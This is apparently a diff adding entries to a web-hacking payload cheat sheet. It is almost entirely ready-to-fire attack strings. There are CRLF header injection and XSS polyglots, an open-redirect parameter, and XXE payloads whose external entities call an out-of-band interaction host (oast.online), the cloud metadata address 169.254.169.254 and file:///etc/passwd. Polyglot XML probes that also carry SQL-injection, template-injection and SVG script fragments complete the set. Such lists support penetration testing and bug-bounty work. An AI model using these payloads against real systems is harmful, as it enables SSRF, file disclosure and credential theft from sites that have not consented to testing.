@@ -11,4 +11,11 @@ CRLF to XSS: %0d%0aX-XSS-Protection:0%0d%0aContent-Type:%20text/html%0d%0a%0d%0a
 XSS:<details+ontoggle=alert(1)>щ#:~:text=щ [https://portswigger-labs.net/xss/xss.php?x=%3Cdetails+ontoggle=write(1)%3E%D1%89#:~:text=%D1%89]
 XSS polygloth: jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e
 [https://github.com/0xsobky/HackVault/wiki/Unleashing-an-Ultimate-XSS-Polyglot]
+Open-redirect:&url=https://c9bc2lb4668eb9k38nugxpxh16fx43dda.oast.online/?s=domain
+XXE to SSRF:<!DOCTYPE foo [<!ENTITY ssrf SYSTEM "https://c9bc2lb4668eb9k38nugxpxh16fx43dda.oast.online/?s=domain"> ]>
+<!DOCTYPE test [ <!ENTITY xxe SYSTEM "http://169.254.169.254/"> ]>
 
+SSRF
+<?xml version="1.0" encoding="UTF-8" ?><!-- 'or 1=1--><!-- "><%=7*7%>{{7*7}}%{48+1} --><!DOCTYPE test [ <!ENTITY x SYSTEM "https://c9bc2lb4668eb9k38nugxpxh16fx43dda.oast.online">]><stockCheck><productId>&x;</productId><storeId>1</storeId><![CDATA[<s><svg/onload=prompt(5);>]]></stockCheck>
+
+<?xml version="1.0" encoding="UTF-8" ?><!-- 'or 1=1--><!-- "><%=7*7%>{{7*7}}%{48+1} --><!DOCTYPE test [ <!ENTITY x SYSTEM "file:///etc/passwd">]><stockCheck><productId>&x;</productId><storeId>1</storeId><![CDATA[<s><svg/onload=prompt(5);>]]></stockCheck>
